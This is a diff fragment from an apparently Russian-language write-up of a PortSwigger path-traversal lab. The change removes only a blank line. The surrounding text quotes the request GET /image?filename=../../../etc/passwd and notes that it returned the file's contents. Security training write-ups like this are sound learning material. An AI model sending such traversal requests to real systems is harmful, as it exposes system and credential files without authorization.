@@ -10,7 +10,6 @@ https://portswigger.net/web-security/file-path-traversal/lab-simple
 <img src="../../assets/lomwt5.png" alt="Скрин" style="width: 90%; max-width: 1000px;" />
 
 
-
 буквально пару мин и готово
 GET /image?filename=../../../etc/passwd
 получил данные файла 
